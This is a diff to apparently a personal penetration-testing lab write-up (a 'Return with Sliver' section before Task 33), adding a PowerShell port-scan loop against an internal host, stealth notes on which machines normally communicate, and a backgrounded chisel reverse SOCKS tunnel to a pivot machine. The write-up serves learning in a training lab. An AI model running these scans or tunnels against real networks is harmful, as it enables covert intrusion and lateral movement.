@@ -617,6 +617,26 @@ shell whoami
 ## Return with Sliver
 
 
+```powershell
+foreach ($port in 80,138,139,443,445,3389) { Test-NetConnection -ComputerName 10.200.96.100 -Port $port -InformationLevel 'Detailed' >> output.txt }
+```
+
+Scream `Test-NetConnect`...`ion`
+![](powertestconmap.png)
+
+From a stealth perspective if we where it is important to note that the .100 and .150 machine do not commute normally, whereas .200 and .100 do.
+![](arpaintdoingmuch.png)
+
+Much like my `nohup $cmd &` trick need a trick for background processes while never having to worry about losing the shell
+
+Backgrounding in PowerShell - [the wonder of Start-Job](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/start-job?view=powershell-7.3)
+```powershell
+start-job { .\chisel.exe client 10.200.96.150:10007 R:10007:127.0.0.10008:socks }
+# Control the job with a identification number 
+start-job -id $int32
+stop-job -id $int32
+remove-job -id $int32
+```
 
 #### Task 33 Personal PC Enumeration
 
